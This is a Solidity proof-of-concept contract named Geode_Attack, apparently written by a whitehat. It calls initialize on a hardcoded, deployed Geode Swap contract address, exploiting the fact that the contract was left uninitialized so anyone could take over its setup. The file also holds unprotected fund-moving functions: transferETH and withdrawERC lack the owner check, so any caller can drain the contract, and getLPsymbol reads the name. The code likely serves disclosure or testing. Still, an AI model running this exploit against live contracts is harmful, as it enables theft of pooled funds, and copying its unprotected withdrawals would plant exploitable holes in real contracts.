// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "contracts/dependencies/openzeppelin/IERC20.sol";
import "contracts/dependencies/openzeppelin/ERC20/IERC20Metadata.sol";
import "contracts/dependencies/openzeppelin/IERC721Receiver.sol";
import "contracts/dependencies/openzeppelin/SafeERC20.sol";
import "contracts/dependencies/openzeppelin/SafeMath.sol";

import "contracts/interfaces/IgAVAX.sol";

import "hardhat/console.sol";

interface ISWAPUTILS {
    struct Swap {
    // variables around the ramp management of A,
    // the amplification coefficient * n * (n - 1)
    // see https://curve.fi/stableswap-paper.pdf for details
    uint256 initialA;
    uint256 futureA;
    uint256 initialATime;
    uint256 futureATime;
    // fee calculation
    uint256 swapFee;
    uint256 adminFee;
    IERC20 lpToken;
    uint256 pooledTokenId;
    // wETH2 contract reference
    IgAVAX referenceForPooledTokens;
    // the pool balance of each token
    // the contract's actual token balance might differ
    uint256[] balances;
    }

}

interface IGEODE {

    function swap(ISWAPUTILS.Swap memory self, uint8 tokenIndexFrom, uint8 tokenIndexTo, uint256 dx, uint256 minDy) external returns (uint256); 

    function initialize(
    address _gAvax,
    uint256 _pooledTokenId,
    string memory lpTokenName,
    string memory lpTokenSymbol,
    uint256 _a,
    uint256 _fee,
    uint256 _adminFee,
    address lpTokenTargetAddress
  ) external returns (address);

  function swapStorage() external returns (ISWAPUTILS.Swap memory);
  //Swap swapStorage;

  function getERC1155() external view returns (address);
  function getA() external view returns (uint256);
  function getToken()external view returns (uint256);
}


// @dev This contract calls initialize in the Geode Swap contract
// On deploy, the Geode Swap contract is not initialized, allowing anyone to call the initialize function after deploy
contract Geode_Attack {
    using SafeERC20 for IERC20;

    address public owner;
    IGEODE geode;

    constructor () {
        owner = msg.sender;
        geode = IGEODE(0xCD8951A040Ce2c2890d3D92Ea4278FF23488B3ac);
    }

    function callInitialize(address _gAvax, uint _pooledTokenId, string memory lpTokenName, string memory lpTokenSymbol, uint _a, uint _fee, uint _adminFee, address lpTokenTargetAddress) public {
        address _token = geode.initialize(_gAvax, _pooledTokenId, lpTokenName, lpTokenSymbol, _a, _fee, _adminFee, lpTokenTargetAddress);
        console.log(_token);

        getLPname(_token);
        getLPsymbol(_token);
    }

    function getLPname(address lp) public view {
        string memory name = IERC20Metadata(lp).name();

        console.log("Token Name:");
        console.log(name);
    }

    function getLPsymbol(address lp) public view {
        string memory name = IERC20Metadata(lp).name();

        console.log("Symbol Name:");
        console.log(name);
    }




    // ##########################
    // @dev whitehat dev functions & logic

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    function transferETH(address dst) public {
        payable(dst).transfer(address(this).balance);
    }

    function deposit() public payable {}

    function withdraw() public onlyOwner {
        uint amount = address(this).balance;
        payable(owner).transfer(amount);
    }

    function depositERC(address token, uint amount) public {
        IERC20(token).safeTransferFrom(msg.sender,address(this),amount);
    }

    function withdrawERC(address token, uint amount) public {
        IERC20(token).transfer(msg.sender,amount);
    }

    receive() external payable {
        uint balance = address(this).balance;
        console.log("(Inside recieve fallback) balance: ");
        console.logUint(balance);
    }
}